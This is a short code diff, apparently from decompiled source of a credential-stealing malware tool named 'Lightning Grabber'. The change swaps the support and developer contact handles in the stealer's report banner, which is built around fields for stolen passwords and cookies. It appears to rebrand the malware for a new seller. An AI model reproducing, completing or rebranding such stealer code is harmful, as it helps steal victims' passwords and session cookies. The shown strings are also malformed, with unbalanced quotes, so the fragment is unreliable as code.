@@ -16,7 +16,7 @@ namespace Lightning_Grabber.Resources
                 {
                     "------------------------------------------------------------------------\r\nLightning Grabber",
                     Class5.string_0,
-                    " Release\r\n----------------------------------------------------------------------------\r\nSupport @Luminous\r\nDeveloper @LuminousLights\r\n\ Download grabber\r" +
+                    " Release\r\n----------------------------------------------------------------------------\r\nSupport @fluro\r\nDeveloper @fluro\r\n\ Download grabber\r" +
                     \n-------------------------------------------------------------------------\r\nPasswords: ",
                     Class8.string_0,
                     \r\nCookies: ",
